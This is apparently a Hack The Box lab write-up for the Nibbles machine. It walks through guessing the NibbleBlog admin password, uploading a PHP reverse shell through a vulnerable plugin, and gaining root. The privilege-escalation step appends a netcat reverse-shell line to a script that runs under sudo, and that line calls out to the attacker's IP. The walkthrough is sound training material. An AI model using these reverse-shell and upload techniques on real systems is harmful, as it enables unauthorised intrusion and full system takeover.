---
title: "Hack The Box - Nibbles"
date: 2020-02-12
tags: [oscp, htb, linux]
collection: oscp-prep
published: true
layout: single
classes: wide
toc: true
toc_label: Table of Contents
headline: "Arbitrary file upload on NibbleBlog"
picture: /assets/htb-nibbles/machine_info.png
author_profile: false
---

![](/assets/htb-nibbles/machine_info.png)

## Enumeration

Nmap results show only TCP ports 22 and 80 open. Port 80 is running Apache 2.4.18 on Ubuntu.

```
Nmap scan report for 10.10.10.75
Host is up, received user-set (0.049s latency).
Not shown: 65533 closed ports
Reason: 65533 conn-refused
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Navigating to the page on port 80 only shows a simple *Hello world!* text. However, if we look at the source of the page, we can see a reference to a `/nibbleblog` directory.

```html
<b>Hello world!</b>














<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

If we navigate to `/nibbleblog`, we can see a Nibble Blog layout.

![](/assets/htb-nibbles/nibbleblog.png)

A directory search found the admin page at `/nibbleblog/admin.php`.

![](/assets/htb-nibbles/nibble_admin.png)

After trying a few simple SQL injections on the admin page and main blog site, I got the below error when trying to get back to the main page. It seems that there might be some protection against brute-forcing. After a few minutes, I was able to access the pages as normal.

![](/assets/htb-nibbles/nibble_blacklist.png)

---

## Initial Shell

### Admin Panel

Before we go getting complicated with SQL injections on the admin page, we should try some easy password guesses. I was able to login with the credentials `admin:nibbles`.

![](/assets/htb-nibbles/admin_panel.png)

Under *Settings*, we can see that this is version 4.0.3 of NibbleBlog, which is vulnerable to a file upload vulnerability, [as detailed here](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html).

![](/assets/htb-nibbles/nibbles_version.png)

To exploit the file upload vulnerability, we need to make sure the My Image plugin is enabled, which it is.

![](/assets/htb-nibbles/admin_plugins.png)

Clicking *Configure* brings us to an upload page, allowing us to upload a file.

![](/assets/htb-nibbles/admin_myimage.png)

For our shell, I used the [PenTest Monkey PHP reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell), built in to Kali. I copied it to the working directory, and modified it to point to my IP, and port 7500.

Once it's set, we just need to browse to the PHP shell, and upload it. Note that you'll get the warnings below, but they can be ignored.

![](/assets/htb-nibbles/upload_warnings.png)

Open a listener with `nc -lvnp 7500`, and navigate to `http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php` to trigger the shell. You'll see a shell for `nibbler` show up on the listener.

![](/assets/htb-nibbles/initial_shell.png)

We can grab `user.txt` from `/home/nibbler/user.txt`

![](/assets/htb-nibbles/user_proof.png)

---

## Privilege Escalation

Now that we have a shell, let's run `LinEnum.sh` to enumerate the system. From the output, we can see that `nibbler` can run `/home/nibbler/personal/stuff/monitor.sh` as `root`.

![](/assets/htb-nibbles/sudoers_nibbler.png)

If we look at the contents of `/home/nibbler`, we can see that there is no `personal` directory, but we do see a file called `personal.zip`.

![](/assets/htb-nibbles/home_dir.png)

If we unzip this file in place, we can see that it contains `personal/stuff/monitor.sh`, which is what we needed for `sudo` to work.

![](/assets/htb-nibbles/unzip.png)

Looking at the contents of `monitor.sh`, we can see that it's a pre-built script to review certain system functions.

```bash
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
        case $name in
          i)iopt=1;;
          v)vopt=1;;
          *)echo "Invalid arg";;
        esac
done

if [[ ! -z $iopt ]]
then
{
wd=$(pwd)
basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
}
fi

if [[ ! -z $vopt ]]
then
{
echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
}
fi

if [[ $# -eq 0 ]]
then
{


# Define Variable tecreset
tecreset=$(tput sgr0)

# Check if connected to Internet or not
ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"

# Check OS Type
os=$(uname -o)
echo -e '\E[32m'"Operating System Type :" $tecreset $os

# Check OS Release Version and Name
cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"

# Check Architecture
architecture=$(uname -m)
echo -e '\E[32m'"Architecture :" $tecreset $architecture

# Check Kernel Release
kernelrelease=$(uname -r)
echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease

# Check hostname
echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME

# Check Internal IP
internalip=$(hostname -I)
echo -e '\E[32m'"Internal IP :" $tecreset $internalip

# Check External IP
externalip=$(curl -s ipecho.net/plain;echo)
echo -e '\E[32m'"External IP : $tecreset "$externalip

# Check DNS
nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 

# Check Logged In Users
who>/tmp/who
echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 

# Check RAM and SWAP Usages
free -h | grep -v + > /tmp/ramcache
echo -e '\E[32m'"Ram Usages :" $tecreset
cat /tmp/ramcache | grep -v "Swap"
echo -e '\E[32m'"Swap Usages :" $tecreset
cat /tmp/ramcache | grep -v "Mem"

# Check Disk Usages
df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
echo -e '\E[32m'"Disk Usages :" $tecreset 
cat /tmp/diskusage

# Check Load Average
loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
echo -e '\E[32m'"Load Average :" $tecreset $loadaverage

# Check System Uptime
tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime

# Unset Variables
unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

# Remove Temporary Files
rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
}
fi
shift $(($OPTIND -1))
```

Most interestingly, we see that the file permissions have made it writable.

![](/assets/htb-nibbles/monitor_writable.png)

All we'll need to do is add a line to the end of the script, containing our reverse shell.

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.20 7600 > /tmp/f" >> monitor.sh
```

Open a listener with `nc -lvnp 7600`, and run `sudo /home/nibbler/personal/stuff/monitor.sh` to kick off the script. We can see the reverse shell on the listener, and grab `root.txt` from `/root/root.txt`.

![](/assets/htb-nibbles/root_proof.png)

